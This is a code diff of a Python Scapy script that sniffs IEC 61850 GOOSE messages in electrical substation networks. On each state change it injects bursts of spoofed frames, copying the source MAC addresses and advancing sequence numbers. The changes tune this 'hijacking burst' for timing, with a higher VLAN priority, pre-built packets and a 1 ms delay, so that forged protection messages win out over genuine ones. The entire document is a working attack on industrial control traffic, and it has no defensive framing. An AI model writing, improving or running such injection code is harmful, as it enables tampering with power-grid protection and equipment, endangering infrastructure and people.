@@ -7,8 +7,9 @@ from scapy.all import *
 INTERFACE = "Ethernet"
 TARGET_APPIDS = [0x0003, 0x0004, 0x0006]
 TOTAL_PACKET_BUDGET = 12
-VLAN_PRIORITY = 0
+VLAN_PRIORITY = 4 # Common for GOOSE
 VLAN_ID = 0
+FIXED_DELAY = 0.001 # Reduced to 1ms for tighter timing
 
 # Get local MAC to ignore our own traffic
 MY_MAC = get_if_hwaddr(INTERFACE)
@@ -22,7 +23,6 @@ except Exception as e:
     exit()
 
 def decode_ber_len(data, offset):
-    """Decodes ASN.1 BER length. Returns (length_value, bytes_consumed)."""
     first_byte = data[offset]
     if first_byte < 0x80:
         return first_byte, 1
@@ -30,14 +30,12 @@ def decode_ber_len(data, offset):
     return int.from_bytes(data[offset + 1 : offset + 1 + n], 'big'), n + 1
 
 def encode_ber_int(tag, value):
-    """Encodes integer to proper BER size triplet."""
     val_bytes = value.to_bytes((value.bit_length() // 8) + 1, byteorder='big')
     if len(val_bytes) > 1 and val_bytes[0] == 0x00 and not (val_bytes[1] & 0x80):
         val_bytes = val_bytes[1:]
     return bytes([tag, len(val_bytes)]) + val_bytes
 
 def patch_goose_lengths(pdu):
-    """Recalculates the PDU and APDU length fields."""
     raw_pdu = bytearray(pdu)
     total_len = len(raw_pdu)
     raw_pdu[2:4] = struct.pack("!H", total_len)
@@ -51,9 +49,7 @@ def patch_goose_lengths(pdu):
     return bytes(raw_pdu)
 
 def get_structural_map(pdu):
-    """Walks the TLV tree to find header fields without touching the payload."""
     mapping = {}
-    # APDU starts at byte 8 (tag 0x61)
     if len(pdu) < 10 or pdu[8] != 0x61: return None
     
     apdu_len, len_size = decode_ber_len(pdu, 9)
@@ -65,38 +61,44 @@ def get_structural_map(pdu):
         v_len, l_size = decode_ber_len(pdu, ptr + 1)
         if tag in [0x85, 0x86]:
             mapping[tag] = {'start': ptr, 'end': ptr + 1 + l_size + v_len}
-        if tag == 0xab: # Stop before the Data Set (payload)
+        if tag == 0xab:
             break
         ptr += 1 + l_size + v_len
     return mapping if (0x85 in mapping and 0x86 in mapping) else None
 
 def launch_hijack_burst(appid, trigger_st, trigger_sq, blueprint):
-    """Background thread for instant injection."""
+    """Background thread optimized for minimal jitter."""
     thread_name = threading.current_thread().name
-    print(f"\n[!!!] [{thread_name}] HIJACKING BURST INITIATED: {hex(appid)}")
     
     header = raw(Ether(src=blueprint["src_mac"], dst=blueprint["dst_mac"]) / 
-                 Dot1Q(prio=VLAN_PRIORITY, vlan=VLAN_ID, type=0x88b8))
+                  Dot1Q(prio=VLAN_PRIORITY, vlan=VLAN_ID, type=0x88b8))
     
     pdu = blueprint["pdu"]
     m = blueprint["map"]
 
+    # --- OPTIMIZATION: PRE-CALCULATE ALL PACKETS ---
+    burst_buffer = []
     for i in range(TOTAL_PACKET_BUDGET):
         attack_sq = trigger_sq + 1 + i 
         st_tlv = encode_ber_int(0x85, trigger_st)
         sq_tlv = encode_ber_int(0x86, attack_sq)
         
-        # Dynamic reconstruction ensures lengths are always correct
         new_pdu = (pdu[:m[0x85]['start']] + st_tlv + 
                    pdu[m[0x85]['end']:m[0x86]['start']] + sq_tlv + 
                    pdu[m[0x86]['end']:])
         
-        send_sock.send(header + patch_goose_lengths(new_pdu))
+        burst_buffer.append(header + patch_goose_lengths(new_pdu))
+
+    # --- EXECUTION: SEND PRE-BUILT PACKETS ---
+    print(f"\n[!!!] [{thread_name}] FIRING PRE-CALCULATED BURST: {hex(appid)}")
+    for packet in burst_buffer:
+        send_sock.send(packet)
+        if FIXED_DELAY > 0:
+            time.sleep(FIXED_DELAY)
         
-    print(f"[*] [{thread_name}] Sent burst for {hex(appid)}.")
+    print(f"[*] [{thread_name}] Burst complete.")
 
 def monitor_and_react(pkt):
-    # 1. IGNORE OWN PACKETS (Stop infinite loop)
     if pkt.src == MY_MAC: return
 
     try:
@@ -110,8 +112,7 @@ def monitor_and_react(pkt):
         s_map = get_structural_map(pdu)
         if not s_map: return
 
-        # Extract current values from known offsets
-        st_val_off = s_map[0x85]['start'] + 2 # Skip tag and length
+        st_val_off = s_map[0x85]['start'] + 2 
         sq_val_off = s_map[0x86]['start'] + 2
         
         current_st = int.from_bytes(pdu[st_val_off : s_map[0x85]['end']], 'big')
@@ -119,12 +120,11 @@ def monitor_and_react(pkt):
 
         if appid not in live_states:
             live_states[appid] = {"st": current_st}
-            print(f"[+] Baseline locked: {hex(appid)} | stNum: {current_st}")
+            print(f"[+] Tracking {hex(appid)} | stNum: {current_st}")
             return
 
-        # 2. TRIGGER ON STATE CHANGE
+        # Trigger on state change
         if current_st != live_states[appid]["st"]:
-            print(f"\n[!] EVENT: {hex(appid)} State Change {live_states[appid]['st']} -> {current_st}")
             live_states[appid]["st"] = current_st
             
             blueprint = {
@@ -134,6 +134,7 @@ def monitor_and_react(pkt):
                 "dst_mac": pkt.dst
             }
             
+            # Offload to thread to keep the sniffer free
             t = threading.Thread(
                 target=launch_hijack_burst, 
                 args=(appid, current_st, current_sq, blueprint),
